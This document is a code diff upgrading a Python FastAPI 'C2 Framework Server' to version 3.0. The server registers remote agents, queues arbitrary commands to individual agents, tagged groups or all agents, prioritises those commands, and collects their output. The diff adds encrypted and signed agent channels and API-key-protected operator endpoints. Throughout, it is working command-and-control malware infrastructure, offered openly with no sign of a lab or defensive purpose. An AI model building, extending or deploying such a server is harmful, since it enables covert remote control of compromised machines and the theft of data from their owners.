@@ -1,24 +1,58 @@
+"""
+C2 Framework Server (FastAPI Async)
+- API key authentication on all endpoints
+- Encrypted communication support (secure endpoints)
+- Proper DB session management with dependency injection
+- Agent tagging/grouping support
+- Command priority system
+- SSL/TLS configuration support
+- Python logging module
+"""
+
 import sys
 import os
 import time
 import json
+import logging
+import ssl
 
 # Add project root to path
 sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
 
-from fastapi import FastAPI, UploadFile, File, Form, Request
+from fastapi import FastAPI, UploadFile, File, Form, Request, Depends, HTTPException, Header
 from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 from sqlalchemy import create_engine, Column, String, Integer, Text
-from sqlalchemy.orm import sessionmaker, declarative_base
-from typing import Optional
+from sqlalchemy.orm import sessionmaker, declarative_base, Session
+from typing import Optional, List
+from contextlib import contextmanager
 
-from encryption.crypto import encrypt_message, decrypt_message, sign_message, verify_signature
+from encryption.crypto import (
+    encrypt_message, decrypt_message,
+    sign_message, verify_signature,
+    secure_encrypt, secure_decrypt,
+    API_KEY
+)
+
+# ── Logging Setup ────────────────────────────────────────────────
+
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
+    handlers=[
+        logging.StreamHandler(),
+        logging.FileHandler(
+            os.path.join(os.path.dirname(__file__), "..", "logs", "server.log"),
+            encoding="utf-8"
+        )
+    ]
+)
+logger = logging.getLogger("c2.server")
 
 # ── App Setup ────────────────────────────────────────────────────
 
-app = FastAPI(title="C2 Framework Server", version="2.0")
+app = FastAPI(title="C2 Framework Server", version="3.0")
 
 app.add_middleware(
     CORSMiddleware,
@@ -31,6 +65,7 @@ app.add_middleware(
 # ── Database Setup ───────────────────────────────────────────────
 
 DB_PATH = os.path.join(os.path.dirname(__file__), "..", "data", "c2server.db")
+os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
 engine = create_engine(f"sqlite:///{DB_PATH}", connect_args={"check_same_thread": False})
 SessionLocal = sessionmaker(bind=engine)
 Base = declarative_base()
@@ -38,6 +73,34 @@ Base = declarative_base()
 # Upload directory
 UPLOAD_DIR = os.path.join(os.path.dirname(__file__), "..", "data")
 os.makedirs(UPLOAD_DIR, exist_ok=True)
+
+# Logs directory
+LOGS_DIR = os.path.join(os.path.dirname(__file__), "..", "logs")
+os.makedirs(LOGS_DIR, exist_ok=True)
+
+
+# ── Dependency: DB Session ───────────────────────────────────────
+
+def get_db():
+    """Proper DB session dependency with automatic cleanup."""
+    db = SessionLocal()
+    try:
+        yield db
+    finally:
+        db.close()
+
+
+# ── Dependency: API Key Authentication ───────────────────────────
+
+async def verify_api_key(x_api_key: str = Header(None)):
+    """
+    Verifies the X-API-Key header on protected endpoints.
+    Dashboard page and static assets are excluded.
+    """
+    if x_api_key is None or x_api_key != API_KEY:
+        logger.warning(f"Unauthorized API access attempt (key: {x_api_key})")
+        raise HTTPException(status_code=401, detail="Invalid or missing API key")
+    return x_api_key
 
 
 # ── Database Tables ──────────────────────────────────────────────
@@ -49,6 +112,7 @@ class AgentDB(Base):
     username = Column(String)
     os_name = Column(String)
     ip_address = Column(String, default="")
+    tags = Column(String, default="")          # Comma-separated tags
     registered_at = Column(Integer, default=0)
     last_seen = Column(Integer, default=0)
 
@@ -60,6 +124,7 @@ class CommandDB(Base):
     command = Column(String)
     timestamp = Column(Integer, default=0)
     status = Column(String, default="pending")
+    priority = Column(Integer, default=0)      # 0=normal, 1=high, 2=urgent
 
 
 class OutputDB(Base):
@@ -85,17 +150,25 @@ Base.metadata.create_all(engine)
 
 # ── Helper: Log an Event ─────────────────────────────────────────
 
-def log_event(agent_id: str, event_type: str, detail: str):
-    db = SessionLocal()
-    entry = LogDB(
-        timestamp=int(time.time()),
-        agent_id=agent_id,
-        event_type=event_type,
-        detail=detail
-    )
-    db.add(entry)
-    db.commit()
-    db.close()
+def log_event(agent_id: str, event_type: str, detail: str, db: Session = None):
+    close_after = False
+    if db is None:
+        db = SessionLocal()
+        close_after = True
+
+    try:
+        entry = LogDB(
+            timestamp=int(time.time()),
+            agent_id=agent_id,
+            event_type=event_type,
+            detail=detail
+        )
+        db.add(entry)
+        db.commit()
+        logger.info(f"[{event_type}] {agent_id}: {detail}")
+    finally:
+        if close_after:
+            db.close()
 
 
 # ── Pydantic Models ──────────────────────────────────────────────
@@ -106,13 +179,21 @@ class Agent(BaseModel):
     username: str
     os_name: str
     ip_address: str = ""
+    tags: str = ""
 
 class Command(BaseModel):
     agent_id: str
     command: str
+    priority: int = 0
 
 class BroadcastCommand(BaseModel):
     command: str
+    priority: int = 0
+
+class GroupCommand(BaseModel):
+    tag: str
+    command: str
+    priority: int = 0
 
 class Output(BaseModel):
     agent_id: str
@@ -126,21 +207,38 @@ class EncryptedPayload(BaseModel):
     ciphertext: str
     signature: str
 
+class TagUpdate(BaseModel):
+    agent_id: str
+    tags: str
+
+class LoginRequest(BaseModel):
+    api_key: str
+
 
 # ── Routes: Home ─────────────────────────────────────────────────
 
 @app.get("/")
 async def home():
-    return {"message": "C2 Server Running", "version": "2.0"}
+    return {"message": "C2 Server Running", "version": "3.0", "encrypted": True}
+
+
+# ── Routes: Login / Auth ─────────────────────────────────────────
+
+@app.post("/auth/login")
+async def login(req: LoginRequest):
+    """Validate API key for dashboard login."""
+    if req.api_key == API_KEY:
+        logger.info("Dashboard login successful")
+        return {"authenticated": True, "api_key": API_KEY}
+    logger.warning("Failed dashboard login attempt")
+    raise HTTPException(status_code=401, detail="Invalid API key")
 
 
 # ── Routes: Agent Registration ───────────────────────────────────
 
 @app.post("/register")
-async def register(agent: Agent):
-    db = SessionLocal()
+async def register(agent: Agent, db: Session = Depends(get_db)):
     existing = db.query(AgentDB).filter(AgentDB.agent_id == agent.agent_id).first()
-
     now = int(time.time())
 
     if not existing:
@@ -150,62 +248,87 @@ async def register(agent: Agent):
             username=agent.username,
             os_name=agent.os_name,
             ip_address=agent.ip_address,
+            tags=agent.tags,
             registered_at=now,
             last_seen=now
         )
         db.add(new_agent)
         db.commit()
-        log_event(agent.agent_id, "register", f"New agent: {agent.hostname} ({agent.username})")
+        log_event(agent.agent_id, "register", f"New agent: {agent.hostname} ({agent.username})", db)
     else:
         existing.last_seen = now
         existing.hostname = agent.hostname
         existing.username = agent.username
         existing.os_name = agent.os_name
         existing.ip_address = agent.ip_address
+        if agent.tags:
+            existing.tags = agent.tags
         db.commit()
-        log_event(agent.agent_id, "re-register", f"Agent reconnected: {agent.hostname}")
+        log_event(agent.agent_id, "re-register", f"Agent reconnected: {agent.hostname}", db)
 
-    db.close()
     return {"message": "agent registered"}
+
+
+# ── Routes: Encrypted Registration ──────────────────────────────
+
+@app.post("/secure/register")
+async def secure_register(payload: EncryptedPayload, db: Session = Depends(get_db)):
+    """Register agent with encrypted payload."""
+    try:
+        data = secure_decrypt(payload.ciphertext, payload.signature)
+        agent_data = json.loads(data.decode())
+        agent = Agent(**agent_data)
+        return await register(agent, db)
+    except ValueError as e:
+        logger.error(f"Secure registration failed: {e}")
+        raise HTTPException(status_code=400, detail=str(e))
 
 
 # ── Routes: Heartbeat ────────────────────────────────────────────
 
 @app.post("/heartbeat")
-async def heartbeat(hb: Heartbeat):
-    db = SessionLocal()
+async def heartbeat(hb: Heartbeat, db: Session = Depends(get_db)):
     agent = db.query(AgentDB).filter(AgentDB.agent_id == hb.agent_id).first()
-
     if agent:
         agent.last_seen = int(time.time())
         db.commit()
-
-    db.close()
     return {"message": "heartbeat received"}
+
+
+# ── Routes: Encrypted Heartbeat ─────────────────────────────────
+
+@app.post("/secure/heartbeat")
+async def secure_heartbeat(payload: EncryptedPayload, db: Session = Depends(get_db)):
+    """Heartbeat with encrypted payload."""
+    try:
+        data = secure_decrypt(payload.ciphertext, payload.signature)
+        hb_data = json.loads(data.decode())
+        hb = Heartbeat(**hb_data)
+        return await heartbeat(hb, db)
+    except ValueError as e:
+        raise HTTPException(status_code=400, detail=str(e))
 
 
 # ── Routes: Commands ─────────────────────────────────────────────
 
 @app.post("/command")
-async def send_command(cmd: Command):
-    db = SessionLocal()
+async def send_command(cmd: Command, db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
     new_command = CommandDB(
         agent_id=cmd.agent_id,
         command=cmd.command,
         timestamp=int(time.time()),
-        status="pending"
+        status="pending",
+        priority=cmd.priority
     )
     db.add(new_command)
     db.commit()
-    db.close()
 
-    log_event(cmd.agent_id, "command", f"Queued: {cmd.command}")
+    log_event(cmd.agent_id, "command", f"Queued (P{cmd.priority}): {cmd.command}", db)
     return {"message": "command stored"}
 
 
 @app.post("/broadcast")
-async def broadcast(cmd: BroadcastCommand):
-    db = SessionLocal()
+async def broadcast(cmd: BroadcastCommand, db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
     agents = db.query(AgentDB).all()
     now = int(time.time())
 
@@ -214,41 +337,88 @@ async def broadcast(cmd: BroadcastCommand):
             agent_id=agent.agent_id,
             command=cmd.command,
             timestamp=now,
-            status="pending"
+            status="pending",
+            priority=cmd.priority
         )
         db.add(new_command)
 
     db.commit()
-    db.close()
-
-    log_event("*", "broadcast", f"Broadcast: {cmd.command}")
+    log_event("*", "broadcast", f"Broadcast (P{cmd.priority}): {cmd.command}", db)
     return {"message": f"command broadcast to {len(agents)} agents"}
 
 
+@app.post("/group_command")
+async def group_command(cmd: GroupCommand, db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
+    """Send a command to all agents with a specific tag."""
+    agents = db.query(AgentDB).filter(AgentDB.tags.contains(cmd.tag)).all()
+    now = int(time.time())
+
+    for agent in agents:
+        new_command = CommandDB(
+            agent_id=agent.agent_id,
+            command=cmd.command,
+            timestamp=now,
+            status="pending",
+            priority=cmd.priority
+        )
+        db.add(new_command)
+
+    db.commit()
+    log_event("*", "group_command", f"Group '{cmd.tag}' (P{cmd.priority}): {cmd.command}", db)
+    return {"message": f"command sent to {len(agents)} agents in group '{cmd.tag}'"}
+
+
 @app.get("/get_command/{agent_id}")
-async def get_command(agent_id: str):
-    db = SessionLocal()
+async def get_command(agent_id: str, db: Session = Depends(get_db)):
+    # Prioritized: urgent (2) > high (1) > normal (0), then by timestamp
     command = db.query(CommandDB).filter(
         CommandDB.agent_id == agent_id,
         CommandDB.status == "pending"
-    ).first()
+    ).order_by(CommandDB.priority.desc(), CommandDB.timestamp.asc()).first()
 
     if command:
         cmd_text = command.command
         command.status = "sent"
         db.commit()
-        db.close()
         return {"command": cmd_text}
 
-    db.close()
     return {"command": ""}
+
+
+# ── Routes: Encrypted Command Retrieval ──────────────────────────
+
+@app.post("/secure/get_command")
+async def secure_get_command(payload: EncryptedPayload, db: Session = Depends(get_db)):
+    """Agent retrieves command with encrypted request."""
+    try:
+        data = secure_decrypt(payload.ciphertext, payload.signature)
+        req = json.loads(data.decode())
+        agent_id = req["agent_id"]
+
+        command = db.query(CommandDB).filter(
+            CommandDB.agent_id == agent_id,
+            CommandDB.status == "pending"
+        ).order_by(CommandDB.priority.desc(), CommandDB.timestamp.asc()).first()
+
+        if command:
+            cmd_text = command.command
+            command.status = "sent"
+            db.commit()
+            response = {"command": cmd_text}
+        else:
+            response = {"command": ""}
+
+        # Encrypt the response
+        encrypted = secure_encrypt(json.dumps(response).encode())
+        return encrypted
+    except ValueError as e:
+        raise HTTPException(status_code=400, detail=str(e))
 
 
 # ── Routes: Output ───────────────────────────────────────────────
 
 @app.post("/send_output")
-async def receive_output(out: Output):
-    db = SessionLocal()
+async def receive_output(out: Output, db: Session = Depends(get_db)):
     new_output = OutputDB(
         agent_id=out.agent_id,
         command=out.command,
@@ -257,15 +427,25 @@ async def receive_output(out: Output):
     )
     db.add(new_output)
     db.commit()
-    db.close()
 
-    log_event(out.agent_id, "output", f"Output for: {out.command[:50]}")
+    log_event(out.agent_id, "output", f"Output for: {out.command[:50]}", db)
     return {"message": "output stored"}
 
 
+@app.post("/secure/send_output")
+async def secure_receive_output(payload: EncryptedPayload, db: Session = Depends(get_db)):
+    """Receive encrypted output from agent."""
+    try:
+        data = secure_decrypt(payload.ciphertext, payload.signature)
+        out_data = json.loads(data.decode())
+        out = Output(**out_data)
+        return await receive_output(out, db)
+    except ValueError as e:
+        raise HTTPException(status_code=400, detail=str(e))
+
+
 @app.get("/outputs")
-async def outputs():
-    db = SessionLocal()
+async def outputs(db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
     data = db.query(OutputDB).order_by(OutputDB.timestamp.desc()).limit(100).all()
     results = []
     for d in data:
@@ -276,15 +456,13 @@ async def outputs():
             "output": d.output,
             "timestamp": d.timestamp
         })
-    db.close()
     return results
 
 
 # ── Routes: Agent Status ─────────────────────────────────────────
 
 @app.get("/agents")
-async def list_agents():
-    db = SessionLocal()
+async def list_agents(db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
     agents = db.query(AgentDB).all()
     current = int(time.time())
     result = []
@@ -297,18 +475,17 @@ async def list_agents():
             "username": a.username,
             "os": a.os_name,
             "ip_address": a.ip_address,
+            "tags": a.tags or "",
             "status": status,
             "last_seen": a.last_seen,
             "registered_at": a.registered_at
         })
 
-    db.close()
     return result
 
 
 @app.get("/status")
-async def status():
-    db = SessionLocal()
+async def status(db: Session = Depends(get_db)):
     agents = db.query(AgentDB).all()
     current = int(time.time())
     result = {}
@@ -316,16 +493,28 @@ async def status():
     for a in agents:
         result[a.agent_id] = "online" if current - a.last_seen < 30 else "offline"
 
-    db.close()
     return result
+
+
+# ── Routes: Agent Tags ───────────────────────────────────────────
+
+@app.post("/agent/tags")
+async def update_tags(tag_update: TagUpdate, db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
+    """Update tags for an agent."""
+    agent = db.query(AgentDB).filter(AgentDB.agent_id == tag_update.agent_id).first()
+    if not agent:
+        raise HTTPException(status_code=404, detail="Agent not found")
+
+    agent.tags = tag_update.tags
+    db.commit()
+    log_event(tag_update.agent_id, "tags", f"Tags updated: {tag_update.tags}", db)
+    return {"message": "tags updated"}
 
 
 # ── Routes: History ──────────────────────────────────────────────
 
 @app.get("/history")
-async def history(agent_id: Optional[str] = None):
-    db = SessionLocal()
-
+async def history(agent_id: Optional[str] = None, db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
     if agent_id:
         data = db.query(OutputDB).filter(OutputDB.agent_id == agent_id).order_by(OutputDB.timestamp.desc()).all()
     else:
@@ -340,15 +529,13 @@ async def history(agent_id: Optional[str] = None):
             "timestamp": d.timestamp
         })
 
-    db.close()
     return results
 
 
 # ── Routes: Logs ─────────────────────────────────────────────────
 
 @app.get("/logs")
-async def get_logs(limit: int = 50):
-    db = SessionLocal()
+async def get_logs(limit: int = 50, db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
     data = db.query(LogDB).order_by(LogDB.timestamp.desc()).limit(limit).all()
     results = []
     for d in data:
@@ -359,7 +546,35 @@ async def get_logs(limit: int = 50):
             "event_type": d.event_type,
             "detail": d.detail
         })
-    db.close()
+    return results
+
+
+@app.get("/logs/export")
+async def export_logs(format: str = "json", db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
+    """Export all logs as JSON or CSV."""
+    data = db.query(LogDB).order_by(LogDB.timestamp.desc()).all()
+    results = []
+    for d in data:
+        results.append({
+            "id": d.id,
+            "timestamp": d.timestamp,
+            "agent_id": d.agent_id,
+            "event_type": d.event_type,
+            "detail": d.detail
+        })
+
+    if format == "csv":
+        import csv
+        import io
+        output = io.StringIO()
+        writer = csv.DictWriter(output, fieldnames=["id", "timestamp", "agent_id", "event_type", "detail"])
+        writer.writeheader()
+        writer.writerows(results)
+        return JSONResponse(
+            content={"csv": output.getvalue()},
+            headers={"Content-Disposition": "attachment; filename=c2_logs.csv"}
+        )
+
     return results
 
 
@@ -388,15 +603,12 @@ async def download_file(filename: str):
 # ── Routes: Agent Management ─────────────────────────────────────
 
 @app.delete("/agent/{agent_id}")
-async def delete_agent(agent_id: str):
-    db = SessionLocal()
-
+async def delete_agent(agent_id: str, db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
     db.query(AgentDB).filter(AgentDB.agent_id == agent_id).delete()
     db.query(CommandDB).filter(CommandDB.agent_id == agent_id).delete()
     db.query(OutputDB).filter(OutputDB.agent_id == agent_id).delete()
     db.query(LogDB).filter(LogDB.agent_id == agent_id).delete()
     db.commit()
-    db.close()
 
     log_event("server", "delete_agent", f"Removed agent: {agent_id}")
     return {"message": f"Agent {agent_id} removed"}
@@ -405,8 +617,7 @@ async def delete_agent(agent_id: str):
 # ── Routes: Dashboard Data ───────────────────────────────────────
 
 @app.get("/dashboard")
-async def dashboard():
-    db = SessionLocal()
+async def dashboard(db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
     agents = db.query(AgentDB).all()
     current = int(time.time())
 
@@ -415,7 +626,6 @@ async def dashboard():
 
     pending = db.query(CommandDB).filter(CommandDB.status == "pending").count()
 
-    db.close()
     return {
         "total_agents": len(agents),
         "online_agents": online,
